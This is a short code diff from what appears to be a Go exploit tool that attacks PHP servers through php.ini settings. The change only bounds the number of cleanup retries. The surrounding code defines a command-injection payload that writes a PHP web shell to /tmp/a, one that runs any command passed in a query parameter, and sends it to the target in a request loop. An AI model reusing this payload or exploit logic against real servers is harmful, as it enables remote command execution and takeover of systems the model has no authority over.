@@ -24,7 +24,7 @@ const (
 	cleanupCommand = ";echo '<?php echo `$_GET[a]`;return;?>'>/tmp/a;which which"
 )
 
-func Attack(requester *Requester, params *AttackParams) error {
+func Attack(requester *Requester, params *AttackParams, cleanRetries int) error {
 	log.Printf("Performing attack using php.ini settings...")
 
 attackLoop:
@@ -44,7 +44,7 @@ attackLoop:
 
 	log.Printf("Trying to cleanup /tmp/a...")
 	cleanup := url.Values{"a": []string{cleanupCommand}}
-	for {
+	for i := 0; i < cleanRetries; i++ {
 		_, body, err := requester.RequestWithQueryStringPrefix("/", params, cleanup.Encode()+"&")
 		if err != nil {
 			return err
